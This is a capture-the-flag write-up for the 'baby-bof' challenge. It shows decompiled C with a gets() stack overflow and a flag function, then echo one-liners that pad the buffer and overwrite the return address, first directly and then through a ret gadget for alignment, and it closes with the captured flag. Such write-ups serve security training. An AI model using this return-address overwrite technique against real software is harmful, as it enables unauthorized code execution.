## Challenge Description

This is a basic buffer overflow.

Flag format: CTF{sha256}

### Intuition

By decompiling we see an obvious buffer overflow and a ``flag`` function that
we can jump to.

```c  
void flag(void)  
{  
 char local_98 [136];  
 FILE *local_10;  
  
 local_10 = fopen("flag.txt","r");  
 if (local_10 == (FILE *)0x0) {  
   puts("Well done!! Now use exploit remote! ");  
                   /* WARNING: Subroutine does not return */  
   exit(0);  
 }  
 fgets(local_98,0x80,local_10);  
 printf(local_98);  
 return;  
}

/* Called by the main function */  
void vuln(void)  
{  
 char local_138 [304];  
  
 gets(local_138);  
 return;  
}

```  
PIE is not enabled so we can just hardcode the addresses in an echo.

### Solution

Simply echo to the binary:  
```  
$ echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x07\x40\x00\x00\x00\x00\x00' | ./bof  
Please enter the flag:  
Segmentation fault (core dumped)  
```  
This crashes because of alignment issues. Let's fix it with a ret gadget
address (found with ROPGadget) to align it back:

```  
echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05\x40\x00\x00\x00\x00\x00\x67\x07\x40\x00\x00\x00\x00\x00' | ./bof  
```

#### Flag

```ctf{c7fabc6bfe7e4b40b78244854f95f089414bb8354e021f89fe632202bb35ef99}```  

Original writeup (https://dothidden.xyz/defcamp_quals_2023/baby-bof/).